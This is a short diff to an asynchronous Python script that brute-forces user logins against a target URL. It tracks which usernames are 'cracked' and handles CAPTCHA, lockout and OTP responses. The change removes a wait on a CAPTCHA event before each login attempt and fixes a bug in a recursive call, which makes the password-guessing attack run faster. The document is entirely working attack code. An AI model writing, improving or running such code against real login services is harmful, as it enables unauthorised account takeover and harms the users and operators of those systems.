@@ -99,7 +99,6 @@ async def _consumer(session, queue, total_users, start, max_attempts, max_durati
         async with lock:
             user_cracked = username in cracked
         if not user_cracked:
-            await captcha_event.wait()
             result = await _attempt_login(session, queue, username, password)
             async with lock:
                 if result is None and username not in cracked: cracked[username] = None
@@ -136,7 +135,7 @@ async def _handle_html_response(session, queue, html, username, password):
         async with session.post(TARGET_URL + '/login', data=payload) as response:
             html = await response.text()
             captcha_event.set()
-            return await _handle_html_response(session, html, username, password)
+            return await _handle_html_response(session, queue, html, username, password)
     elif msg == "locked" or msg == "wrong OTP":
         return None
     return msg == "logged in"
